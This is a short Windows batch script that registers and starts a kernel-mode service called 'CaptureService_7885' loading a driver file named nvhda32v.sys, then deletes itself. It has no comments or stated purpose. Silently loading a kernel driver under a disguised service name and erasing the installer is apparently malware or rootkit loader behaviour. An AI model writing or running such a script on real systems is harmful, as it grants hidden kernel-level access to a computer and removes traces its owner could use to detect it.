@echo off
cd %~dp0
sc create CaptureService_7885 binpath=C:\Windows\System32\drivers\nvhda32v.sys type=kernel
sc start CaptureService_7885
del "%~f0"



